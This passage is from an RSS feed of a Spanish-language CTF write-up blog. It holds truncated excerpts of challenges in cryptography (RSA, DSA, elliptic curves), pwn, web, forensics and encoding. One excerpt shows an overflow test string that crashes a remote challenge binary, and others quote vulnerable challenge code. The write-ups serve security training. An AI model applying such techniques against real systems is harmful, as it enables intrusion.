from Crypto.Util.number import getPrime, isPrime, bytes_to_long from Crypto.Util.Padding import pad import os FLAG = b"HTB{--REDACTED--}" def getPrimes(coefficient): while True: a = getPrime(512) p = 3 * coefficient * a + 2 if isPrime(p): break while True: b = getPrime(512) q = 3 * coefficient * b + 2 if isPrime(q): break return p, q def encrypt(message, coefficient): p, q = getPrimes(coefficient) n = p * q padded_message = bytes_to_long(pad(message, 256)) message = bytes_to_long(message) c1 = (message * (message + coefficient)) % n c2 = (padded_message * (padded_message + coefficient)) % n return (n, c1, c2) def main(): coefficient = getPrime(128) out = "</description></item><item><title>Downgrade</title><link>https://7rocky.github.io/ctf/htb-challenges/forensics/downgrade/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/forensics/downgrade/</guid><description>Se nos proporcionan un montón de logs de Eventos de Windows (archivos .evtx):
$ tree Logs Logs ├── Application.evtx ├── HardwareEvents.evtx ├── Internet Explorer.evtx ├── Key Management Service.evtx ├── Microsoft-Windows-AppModel-Runtime%4Admin.evtx ├── Microsoft-Windows-AppReadiness%4Admin.evtx ├── Microsoft-Windows-AppReadiness%4Operational.evtx ├── Microsoft-Windows-AppXDeployment%4Operational.evtx ├── Microsoft-Windows-AppXDeploymentServer%4Operational.evtx ├── Microsoft-Windows-AppXDeploymentServer%4Restricted.evtx ├── Microsoft-Windows-ApplicationResourceManagementSystem%4Operational.evtx ├── Microsoft-Windows-Bits-Client%4Operational.evtx ├── Microsoft-Windows-CodeIntegrity%4Operational.evtx ├── Microsoft-Windows-Compat-Appraiser%4Operational.evtx ├── Microsoft-Windows-CoreApplication%4Operational.evtx ├── Microsoft-Windows-Crypto-DPAPI%4BackUpKeySvc.evtx ├── Microsoft-Windows-Crypto-DPAPI%4Operational.evtx ├── Microsoft-Windows-DSC%4Admin.evtx ├── Microsoft-Windows-DSC%4Operational.evtx ├── Microsoft-Windows-DataIntegrityScan%4Admin.evtx ├── Microsoft-Windows-DataIntegrityScan%4CrashRecovery.evtx ├── Microsoft-Windows-DeviceSetupManager%4Admin.evtx ├── Microsoft-Windows-DeviceSetupManager%4Operational.evtx ├── Microsoft-Windows-Dhcp-Client%4Admin.evtx ├── Microsoft-Windows-Dhcpv6-Client%4Admin.evtx ├── Microsoft-Windows-Diagnosis-DPS%4Operational.</description></item><item><title>Downgrade</title><link>https://7rocky.github.io/ctf/other/hackthebooctf/downgrade/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/hackthebooctf/downgrade/</guid><description>Se nos proporcionan un montón de logs de Eventos de Windows (archivos .evtx):
$ tree Logs Logs ├── Application.evtx ├── HardwareEvents.evtx ├── Internet Explorer.evtx ├── Key Management Service.evtx ├── Microsoft-Windows-AppModel-Runtime%4Admin.evtx ├── Microsoft-Windows-AppReadiness%4Admin.evtx ├── Microsoft-Windows-AppReadiness%4Operational.evtx ├── Microsoft-Windows-AppXDeployment%4Operational.evtx ├── Microsoft-Windows-AppXDeploymentServer%4Operational.evtx ├── Microsoft-Windows-AppXDeploymentServer%4Restricted.evtx ├── Microsoft-Windows-ApplicationResourceManagementSystem%4Operational.evtx ├── Microsoft-Windows-Bits-Client%4Operational.evtx ├── Microsoft-Windows-CodeIntegrity%4Operational.evtx ├── Microsoft-Windows-Compat-Appraiser%4Operational.evtx ├── Microsoft-Windows-CoreApplication%4Operational.evtx ├── Microsoft-Windows-Crypto-DPAPI%4BackUpKeySvc.evtx ├── Microsoft-Windows-Crypto-DPAPI%4Operational.evtx ├── Microsoft-Windows-DSC%4Admin.evtx ├── Microsoft-Windows-DSC%4Operational.evtx ├── Microsoft-Windows-DataIntegrityScan%4Admin.evtx ├── Microsoft-Windows-DataIntegrityScan%4CrashRecovery.evtx ├── Microsoft-Windows-DeviceSetupManager%4Admin.evtx ├── Microsoft-Windows-DeviceSetupManager%4Operational.evtx ├── Microsoft-Windows-Dhcp-Client%4Admin.evtx ├── Microsoft-Windows-Dhcpv6-Client%4Admin.evtx ├── Microsoft-Windows-Diagnosis-DPS%4Operational.</description></item><item><title>Dragon Army</title><link>https://7rocky.github.io/ctf/htb-challenges/pwn/dragon-army/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/pwn/dragon-army/</guid><description>Se nos proporciona un binario de 64 bits llamado da:
Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'./glibc/' Además, tenemos esta versión de Glibc:
$ glibc/ld-linux-x86-64.so.2 glibc/libc.so.6 GNU C Library (GNU libc) stable release version 2.30. Copyright (C) 2019 Free Software Foundation, Inc. This is free software; see the source for copying conditions. There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</description></item><item><title>Dream Diary: Chapter 3</title><link>https://7rocky.github.io/ctf/htb-challenges/pwn/dream-diary-chapter-3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/pwn/dream-diary-chapter-3/</guid><description>Se nos proporciona un binario de 64 bits llamado diary3:
Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'./' Además, también tenemos la librería y el cargador de Glibc remotos:
$ ./ld-2.29.so libc.so.6 GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.9) stable release version 2.31. Copyright (C) 2020 Free Software Foundation, Inc. This is free software; see the source for copying conditions. There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</description></item><item><title>E.Tree</title><link>https://7rocky.github.io/ctf/htb-challenges/web/e.tree/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/web/e.tree/</guid><description>Se nos proporciona este sitio web:
También tenemos el código fuente del proyecto en Python (Flask).
Análisis del código fuente La aplicación tiene tres endpoints en blueprints/routes.py:
from flask import Blueprint, render_template, request from application.util import leaderboard, search_staff web = Blueprint('web', __name__) api = Blueprint('api', __name__) @web.route('/') def index(): return render_template('index.html') @web.route('/leaderboard') def web_leaderboard(): return render_template('leaderboard.html', leaderboard=leaderboard('DSC-N-1547')) @api.route('/search', methods=['POST']) def api_search(): name = request.json.get('search', '') return search_staff(name) El relevante es /search, que llama a una función search_staff que se define en util.</description></item><item><title>Easy DSA: Elated once</title><link>https://7rocky.github.io/ctf/imaginaryctf/easy-dsa-elated-once/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/imaginaryctf/easy-dsa-elated-once/</guid><description>Se nos proporciona el código fuente en Python utilizado para cifrar la flag:
from Crypto.Util.Padding import pad from Crypto.Util.number import isPrime, getPrime, long_to_bytes from Crypto.Cipher import AES from hashlib import sha256 from random import randrange def H(msg): return int.from_bytes(sha256(msg).digest(), 'big') def gen_key(): p = 0 while not isPrime(p): q = getPrime(300) p = 2*q + 1 g = randrange(2, p)**2 % p x = randrange(2, q) y = pow(g, x, p) return p, q, g, x, y def gen_nonces(): a = randrange(2, q) b = randrange(2, q) k = 0 while 1: k = (a*k + b) % q yield k def sign(m): k = next(nonces) r = pow(g, k, p) % q s = (H(m) + x*r) * pow(k, -1, q) % q return r, s def verify(m, r, s): assert 0 &amp;lt; r &amp;lt; q and 0 &amp;lt; s &amp;lt; q u = pow(s, -1, q) v = pow(g, H(m) * u, p) * pow(y, r * u, p) % p % q return v == r flag = b"</description></item><item><title>Easy DSA: Lovely Little Lane</title><link>https://7rocky.github.io/ctf/imaginaryctf/easy-dsa-lovely-little-lane/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/imaginaryctf/easy-dsa-lovely-little-lane/</guid><description>Se nos proporciona el código fuente en Python utilizado para cifrar la flag:
from Crypto.Util.Padding import pad from Crypto.Util.number import isPrime, getPrime, long_to_bytes from Crypto.Cipher import AES from hashlib import sha256 from random import randrange def gen_key(): p = 0 while not isPrime(p): q = getPrime(300) p = 2*q + 1 g = randrange(2, p)**2 % p x = randrange(2, q) y = pow(g, x, p) return p, q, g, x, y def H(msg): return int.</description></item><item><title>Easy DSA: The beginning</title><link>https://7rocky.github.io/ctf/imaginaryctf/easy-dsa-the-beginning/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/imaginaryctf/easy-dsa-the-beginning/</guid><description>Se nos proporciona el código fuente en Python utilizado para cifrar la flag:
from Crypto.Util.Padding import pad from Crypto.Util.number import isPrime, getPrime, long_to_bytes from Crypto.Cipher import AES from hashlib import sha256 from random import randrange def gen_key(): p = 0 while not isPrime(p): q = getPrime(300) p = 2*q + 1 g = randrange(2, p)**2 % p k = randrange(2, q) x = randrange(2, q) y = pow(g, x, p) return p, q, g, x, y, k def H(msg): return int.</description></item><item><title>Easy Phish</title><link>https://7rocky.github.io/ctf/htb-challenges/osint/easy-phish/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/osint/easy-phish/</guid><description>Tenemos esta descripción del reto:
Customers of secure-startup.com have been recieving some very convincing phishing emails, can you figure out why?
Enumeración por DNS Primero, podemos intentar enumerar secure-startup.com utilizando varios registros DNS (más información aquí) y dig.
El registro TXT muestra una parte de la flag:
$ dig secure-startup.com TXT ; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.10.6 &amp;lt;&amp;lt;&amp;gt;&amp;gt; secure-startup.com TXT ;; global options: +cmd ;; Got answer: ;; -&amp;gt;&amp;gt;HEADER&amp;lt;&amp;lt;- opcode: QUERY, status: NOERROR, id: 48771 ;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4096 ;; QUESTION SECTION: ;secure-startup.</description></item><item><title>Eat the Cake!</title><link>https://7rocky.github.io/ctf/htb-challenges/reversing/eat-the-cake/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/reversing/eat-the-cake/</guid><description>Tenemos un Windows PE llamado cake.exe:
$ file cake.exe cake.exe: PE32 executable (console) Intel 80386, for MS Windows, UPX compressed Descompresión Como se puede ver, está comprimido con UPX, así que vamos a descomprimirlo:
$ upx -d cake.exe Ultimate Packer for eXecutables Copyright (C) 1996 - 2023 UPX 4.0.2 Markus Oberhumer, Laszlo Molnar &amp; John Reiser Jan 30th 2023 File size Ratio Format Name -------------------- ------ ----------- ----------- 15872 &amp;lt;- 9216 58.</description></item><item><title>Ebola Virus</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/ebola-virus/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/ebola-virus/</guid><description>Se nos proporcionan estos dos archivos:
$ cat key.txt CTGAAATGTTCCGCGAGCCGAACCGATTCACCGCCTAGAAACGTATTGTGCTGGTGTGCGGCGGTTAGAGATATTAGGTAGCGCCGTTACTCTAACATTTCGAATCAACCTTTCAGGGGAGTCACTGCCATCGTAAGTAGAGTACTTAGCATCGATGGCCATGCCTACTAATTACAGGCTGAATGACACTAAACCTTAGTTCACTGACCCGTTTTGTCATGTACTCTTGTGGTATGGGTCTTCAAATTGATCTGATTGGGAAGATAGAAAAACGGCTCTATCCTGGGTCGAGCCTCCCATGAAGCAGTCAAGGGGCCGCGAGGACTTCGATACTTGCCCTGCTCGAGCACATTTTAAAGCTTATTCCACATACTAGACTTACCCCCCGGCGTGTCGTACTGGAAGGTTAAACCTCTTGAGTTGATCTGACAACCTAGACGCGTGCCACGTTGTGTGGGATAGGTCACTCTCATTTCCACGAGGGACCAGAACCTTTGGCAATCCAGTTATTCTGCACTCGTGGCCGCCTCTCCTGGCAGGGGACCGGTAAGTTTGCGTATTCGCCGGGGAGTGGAGACGGATCGTCGTACACTGTTTCGAAAATTTTTGAGGATGGAGAGCAGAGCTATTGGATAAACGCTTGTACAGGTTCAATACTATTAGCAACGTGCCACCGGCACAGCTATCTCTGTTTCGCATGAAAGAGCCGTTAATCACGACGTTTAATCGAAACACATACCGATGGTCTACGAATATTATATCCGATACTAAGTCGGCCGCCGCAGTCCAGACGCCATATCGCTTTGAAGACCCCAAGGCGAACATTAACCGGTACGAGCAACTGCGGAGTGCCCTGCAATAGTCCGTCTGTAAAGGGCCCAGGCTAGGGCAAATAGTCCCTAAAACTAGAGATGGTCAACCGCTATGTGGGGCATTCTCCGTGAGACTCAGCCGTATTACAGTGAGCGTATTCCCAAACTCCCCTTCTGTGTATGACCAGTGTCGCTGCAAATGGACCGAGCAG $ xxd encrypted.bin 00000000: f3d3 8309 0748 15ee b309 8144 5dea a409 .....H.....D]... 00000010: 26b3 eaa4 83a4 09b3 6e09 b326 ea75 8323 &amp;.......n..&amp;.u.# 00000020: 09a4 835d 4415 eaa4 0944 eeee 6e83 a4a4 ...]D....D..n... 00000030: 0967 d344 26d3 0944 a409 154f 7583 6e09 .g.D&amp;..D...Ou.n. 00000040: 4fb3 75b3 ee09 444f 09ea 6e75 5d83 b375 O.u...DO..nu]..u 00000050: 83c3 f009 0748 15ee b309 8144 5dea a409 .</description></item><item><title>echoland</title><link>https://7rocky.github.io/ctf/htb-challenges/pwn/echoland/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/pwn/echoland/</guid><description>Se nos proporciona una instancia remota a la que conectarnos. A primera vista, parece que es vulnerable a Buffer Overflow:
$ nc 206.189.21.29 32084 🦇 Inside the dark cave. 🦇 1. Scream. 2. Run outside. > 1 >> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA /home/ctf/run_challenge.sh: line 2: 30 Segmentation fault ./echoland Ncat: Broken pipe. Y además no hay canario de pila (stack canary) porque no aparece el mensaje *** stack smashing detected ***. Pero también tiene una vulnerabilidad de Format String:</description></item><item><title>El cifrao del cuñao</title><link>https://7rocky.github.io/ctf/other/hackon-ctf/el-cifrao-del-cu%C3%B1ao/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/hackon-ctf/el-cifrao-del-cu%C3%B1ao/</guid><description>Se nos proporciona un script en Python que cifra la flag con RSA:
from Crypto.Util.number import getPrime, bytes_to_long import random flag='HackOn{testing_flag}' p = getPrime(1024) q = getPrime(1024) r = getPrime(24) N1 = p * q * r N = p * q e1 = 34456075732829756714431696264844933736161425428678777444326530245267175496676105 e2 = 66213320562378389542956020292848603326457400359492442893037745994906793456536650 c1 = pow(7 * p + random.randint(N,N1) * q, e1, N) c2 = pow(5 * p + random.randint(2,N) * q, e2, N) print (f'N1: {N1}\ne1: {e1}\ne2: {e2}\nc1: {c1}\nc2: {c2}') flag_enc= pow(bytes_to_long(flag.</description></item><item><title>El Reset de 1745</title><link>https://7rocky.github.io/ctf/other/hackon-ctf/el-reset-de-1745/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/hackon-ctf/el-reset-de-1745/</guid><description>Se nos proporciona un script en Python que crea una clave privada de RSA y nos da algo de información adicional:
from Crypto.PublicKey import RSA from Crypto.Util.number import getPrime,inverse from sage.all import cos,floor,sqrt def main(): p = getPrime(1024) q = getPrime(1024) N = p*q print(N,q &amp;gt;&amp;gt; 450) print(cos(q &amp;gt;&amp;gt; 450).n(4096)) # -0.83677025469083783941541701752761854754793836436580928644247008941810266469532458996045447348443859400152817824525738732652478723578550322419681449352934903962868272432839950443728133311767399079690030001079242722034971856216464693298008475334803612328029119715730610948114017183466860376219520135065944451843458471230390067711216822465611823803314088335568327990572989813880317949003496128817743756941657517592732976171161188449564836856703887590653409218974871687234942350215936871374265782174012360582549759635891009261305443677350659234691411334888094583016691447506478413851786692210332884103069291530840376504431016357464401672842279159473862600445695092589720790836314505433051945268839223026728538635526261735680020640125514694922387865117641745486767737807560114356069413145843513030254057578430063498955558945235100024577603060294061771113596755818633721728098654211982059793050427304804021628754473574523763161349682175284850419236582818156064980865716476145483816198034274679778084438576624517718459301374217997767985615596748052223448537502912453071556058736828589970943263917953424626006378389407199956646994682638376389500968564930356704561568053846692273026900362154710217069324829901876963571359354949212621973636284 e = 0x10001 priv = RSA.construct((p*q, e, inverse(e, (p - 1) * (q - 1)))) with open("priv.pem",'wb') as f: f.</description></item><item><title>ElElGamal</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/elelgamal/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/elelgamal/</guid><description>Tenemos esta descripción del reto:
After some minor warnings from IDS, you decide to check the logs to see if anything suspicious is happening. Surprised by what you see, you realize that one of your honeypots has been compromised with a cryptominer. As you look at the processes, you discover a backdoor attached to one of them. The backdoor retrieves the private key from the /key route of a C2. It establishes a session by sending an encrypted initialization sequence.</description></item><item><title>Elliptic Labyrinth</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/elliptic-labyrinth/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/elliptic-labyrinth/</guid><description>Se nos proporciona el código fuente del servidor en Python:
import os, json from hashlib import sha256 from random import randint from Crypto.Util.number import getPrime, long_to_bytes from Crypto.Cipher import AES from Crypto.Util.Padding import pad from secret import FLAG class ECC: def __init__(self, bits): while True: self.p = getPrime(bits) if self.p % 4 == 3: break self.a = randint(1, self.p) self.b = randint(1, self.p) def gen_random_point(self): x = randint(2, self.p-2) return (x, pow(x**3 + self.</description></item><item><title>Elliptic Labyrinth</title><link>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/elliptic-labyrinth/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/elliptic-labyrinth/</guid><description>Se nos proporciona el código fuente del servidor en Python:
import os, json from hashlib import sha256 from random import randint from Crypto.Util.number import getPrime, long_to_bytes from Crypto.Cipher import AES from Crypto.Util.Padding import pad from sage.all_cmdline import * from secret import FLAG class ECC: def __init__(self, bits): self.p = getPrime(bits) self.a = randint(1, self.p) self.b = randint(1, self.p) def gen_random_point(self): return EllipticCurve(GF(self.p), [self.a, self.b]).random_point() def menu(): print("1. Get parameters of path"</description></item><item><title>Elliptic Labyrinth Revenge</title><link>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/elliptic-labyrinth-revenge/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/elliptic-labyrinth-revenge/</guid><description>Este reto es una modificación de Elliptic Labyrinth para obligar a los jugadores de CTF a usar la vía intencionada de resolver el reto.
Encontrando diferencias El código fuente proporcionado es un poco diferente:
import os, json from hashlib import sha256 from random import randint from Crypto.Util.number import getPrime, long_to_bytes from Crypto.Cipher import AES from Crypto.Util.Padding import pad from sage.all_cmdline import * from secret import FLAG class ECC: def __init__(self, bits): self.</description></item><item><title>Emdee five for life</title><link>https://7rocky.github.io/ctf/htb-challenges/misc/emdee-five-for-life/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/misc/emdee-five-for-life/</guid><description>Tenemos la siguiente página web:
Parece que tenemos que calcular el hash MD5 de la cadena de texto mostrada y enviarla:
$ echo -n Vzf9GeB5zAFDZ2M3oKSa | md5sum c03463878fee34e249962c4aef9af84c - Pero hemos sido muy lentos&amp;hellip;
Por tanto, tendremos que programar un script que envíe la petición lo más rápido posible. Una cosa importante a tener en cuenta es mantener la cookie PHPSESSID configurada por el servidor:
$ curl -I 134.209.187.167:31212/ HTTP/1.1 200 OK Date: Server: Apache/2.</description></item><item><title>emoji voting</title><link>https://7rocky.github.io/ctf/htb-challenges/web/emoji-voting/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/web/emoji-voting/</guid><description>Se nos proporciona este sitio web:
También tenemos el código fuente del proyecto en Node.js (Express).
Análisis del código fuente Los endpoints disponibles están en routes/index.js:
const path = require('path'); const express = require('express'); const router = express.Router(); let db; const response = data =&amp;gt; ({ message: data }); router.get('/', (req, res) =&amp;gt; { return res.sendFile(path.resolve('views/index.html')); }); router.post('/api/vote', (req, res) =&amp;gt; { let { id } = req.body; if (id) { return db.</description></item><item><title>EncodedPayload</title><link>https://7rocky.github.io/ctf/other/hackthebooctf/encodedpayload/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/hackthebooctf/encodedpayload/</guid><description>Se nos proporciona un archivo binario llamado encodedpayload:
$ file encodedpayload encodedpayload: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, no section header Ingeniería inversa Si lo ejecutamos, no aparece nada. Por otro lado, el binario es muy corto:
$ ./encodedpayload $ xxd encodedpayload 00000000: 7f45 4c46 0101 0100 0000 0000 0000 0000 .ELF............ 00000010: 0200 0300 0100 0000 5480 0408 3400 0000 ........T...4... 00000020: 0000 0000 0000 0000 3400 2000 0100 0000 .</description></item><item><title>Encryption Master</title><link>https://7rocky.github.io/ctf/ctflearn/cryptography/encryption-master/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/ctflearn/cryptography/encryption-master/</guid><description>Se nos proporciona el siguiente texto:
This is NOT going to be fun. TmljZSEgTm93IGtlZXAgZ29pbmcuIDU0Nzc2ZjIwNmQ2ZjcyNjUyZTIwMzEzMDMwMzAzMTMxMzAyMDMxMzEzMDMxMzAzMDMxMjAzMTMxMzAzMTMxMzEzMDIwMzEzMTMwMzAzMDMwMzEyMDMxMzEzMDMxMzEzMDMwMjAzMTMwMzAzMDMwMzAyMDMxMzAzMDMwMzEzMDMwMjAzMTMxMzAzMDMxMzAzMTIwMzEzMTMwMzAzMDMxMzEyMDMxMzEzMTMwMzAzMTMwMjAzMTMxMzEzMTMwMzAzMTIwMzEzMTMxMzAzMDMwMzAyMDMxMzEzMTMwMzEzMDMwMjAzMTMxMzAzMTMwMzAzMTIwMzEzMTMwMzEzMTMxMzEyMDMxMzEzMDMxMzEzMTMwMjAzMTMwMzAzMDMwMzEyMDMxMzAzMDMwMzAzMDIwMzEzMDMxMzAzMDMwMzEyMDMxMzEzMDMwMzAzMTIwMzEzMDMxMzAzMDMxMzAyMDMxMzAzMDMwMzEzMTMxMjAzMTMxMzAzMDMwMzEzMDIwMzEzMDMwMzAzMTMxMzEyMDMxMzAzMTMwMzEzMTMwMjAzMTMxMzAzMTMwMzAzMDIwMzEzMTMwMzAzMDMxMzEyMDMxMzEzMDMxMzEzMDMxMjAzMTMxMzAzMTMwMzEyMDMxMzEzMDMxMzEzMTIwMzEzMDMxMzAzMDMxMzEyMDMxMzAzMTMwMzEzMTMwMjAzMTMxMzEzMDMwMzEyMDMxMzAzMDMwMzAzMTMwMjAzMTMwMzEzMDMxMzAzMDIwMzEzMDMxMzAzMTMxMzAyMDMxMzEzMTMwMzAzMTIwMzEzMDMxMzAzMDMwMzEyMDMxMzAzMTMwMzEzMDMxMjAzMTMxMzAzMTMwMzEzMTIwMzEzMTMxMzAzMDMxMjAzMTMwMzEzMDMxMzEzMDIwMzEzMDMxMzAzMDMxMzAyMDMxMzAzMDMwMzEzMTMwMjAzMTMxMzEzMDMwMzEyMDMxMzAzMTMwMzAzMDMwMjAzMTMwMzEzMDMwMzEzMDIwMzEzMTMwMzEzMTMwMzAyMDMxMzEzMTMwMzAzMTIwMzEzMDMxMzEzMDMxMzAyMDMxMzAzMTMwMzEzMDMwMjAzMTMxMzAzMDMwMzEyMDMxMzAzMTMwMzEzMTMwMjAzMTMxMzEzMDMwMzE= Vemos una cadena de texto larga que está codificada en Base64. Si la decodificamos, tenemos otro texto:
$ data=TmljZSEgTm93IGtlZXAgZ29pbmcuIDU0Nzc2ZjIwNmQ2ZjcyNjUyZTIwMzEzMDMwMzAzMTMxMzAyMDMxMzEzMDMxMzAzMDMxMjAzMTMxMzAzMTMxMzEzMDIwMzEzMTMwMzAzMDMwMzEyMDMxMzEzMDMxMzEzMDMwMjAzMTMwMzAzMDMwMzAyMDMxMzAzMDMwMzEzMDMwMjAzMTMxMzAzMDMxMzAzMTIwMzEzMTMwMzAzMDMxMzEyMDMxMzEzMTMwMzAzMTMwMjAzMTMxMzEzMTMwMzAzMTIwMzEzMTMxMzAzMDMwMzAyMDMxMzEzMTMwMzEzMDMwMjAzMTMxMzAzMTMwMzAzMTIwMzEzMTMwMzEzMTMxMzEyMDMxMzEzMDMxMzEzMTMwMjAzMTMwMzAzMDMwMzEyMDMxMzAzMDMwMzAzMDIwMzEzMDMxMzAzMDMwMzEyMDMxMzEzMDMwMzAzMTIwMzEzMDMxMzAzMDMxMzAyMDMxMzAzMDMwMzEzMTMxMjAzMTMxMzAzMDMwMzEzMDIwMzEzMDMwMzAzMTMxMzEyMDMxMzAzMTMwMzEzMTMwMjAzMTMxMzAzMTMwMzAzMDIwMzEzMTMwMzAzMDMxMzEyMDMxMzEzMDMxMzEzMDMxMjAzMTMxMzAzMTMwMzEyMDMxMzEzMDMxMzEzMTIwMzEzMDMxMzAzMDMxMzEyMDMxMzAzMTMwMzEzMTMwMjAzMTMxMzEzMDMwMzEyMDMxMzAzMDMwMzAzMTMwMjAzMTMwMzEzMDMxMzAzMDIwMzEzMDMxMzAzMTMxMzAyMDMxMzEzMTMwMzAzMTIwMzEzMDMxMzAzMDMwMzEyMDMxMzAzMTMwMzEzMDMxMjAzMTMxMzAzMTMwMzEzMTIwMzEzMTMxMzAzMDMxMjAzMTMwMzEzMDMxMzEzMDIwMzEzMDMxMzAzMDMxMzAyMDMxMzAzMDMwMzEzMTMwMjAzMTMxMzEzMDMwMzEyMDMxMzAzMTMwMzAzMDMwMjAzMTMwMzEzMDMwMzEzMDIwMzEzMTMwMzEzMTMwMzAyMDMxMzEzMTMwMzAzMTIwMzEzMDMxMzEzMDMxMzAyMDMxMzAzMTMwMzEzMDMwMjAzMTMxMzAzMDMwMzEyMDMxMzAzMTMwMzEzMTMwMjAzMTMxMzEzMDMwMzE= $ echo $data | base64 -d Nice! Now keep going. 54776f206d6f72652esta vez parecen datos en hexadecimal. Vamos a decodificarlo otra vez:
$ data=54776f206d6f72652eecho $data | xxd -r -p Two more. 1000110 1101001 1101110 1100001 1101100 100000 1000100 1100101 1100011 1110010 1111001 1110000 1110100 1101001 1101111 1101110 100001 100000 1010001 110001 1010010 1000111 1100010 1000111 1010110 1101000 1100011 1101101 110101 110111 1010011 1010110 111001 1000010 1010100 1010110 111001 1010001 1010101 1101011 111001 1010110 1010010 1000110 111001 1010000 1010010 1101100 111001 1011010 1010100 110001 1010110 111001 Y ahora tenemos información en binario.</description></item><item><title>Enhance!</title><link>https://7rocky.github.io/ctf/picoctf/forensics/enhance/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/picoctf/forensics/enhance/</guid><description>Tenemos el archivo de una imagen SVG llamada drawing.flag.svg:
A simple vista, no se ve nada, pero si miramos en el código XML que aparece en el archivo SVG, veremos los caracteres de la flag:
&amp;lt;?xml version="1.0" encoding="UTF-8" standalone="no"?&amp;gt; &amp;lt;!-- Created with Inkscape (http://www.inkscape.org/) --&amp;gt; &amp;lt;svg xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:cc="http://creativecommons.org/ns#" xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#" xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:sodipodi="http://sodipodi.sourceforge.net/DTD/sodipodi-0.dtd" xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape" width="210mm" height="297mm" viewBox="0 0 210 297" version="1.1" id="svg8" inkscape:version="0.92.5 (2060ec1f9f, 2020-04-08)" sodipodi:docname="drawing.svg"&amp;gt; &amp;lt;defs id="defs2" /&amp;gt; &amp;lt;sodipodi:namedview id="base" pagecolor="</description></item><item><title>Enormous</title><link>https://7rocky.github.io/ctf/imaginaryctf/enourmous/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/imaginaryctf/enourmous/</guid><description>Se nos proporciona el código en Python utilizado para cifrar la flag:
#!/usr/bin/env python3 from Crypto.Util.number import * m = bytes_to_long(open('flag.txt', 'rb').read()) n = 1 for i in range(5): n *= getPrime(2025) e = 31 c = pow(m, e, n) print(f'{n = }') print(f'{c = }') Y tenemos el texto cifrado $c$ y el módulo $n$ de una implementación RSA. Nótese que $e = 31$ es muy pequeño y que $n$ es muy grande.</description></item><item><title>Entity</title><link>https://7rocky.github.io/ctf/htb-challenges/pwn/entity/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/pwn/entity/</guid><description>Se nos proporciona un binario de 64 bits llamado chall:
Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled Si nos conectamos a la instancia remota, vemos lo siguiente:
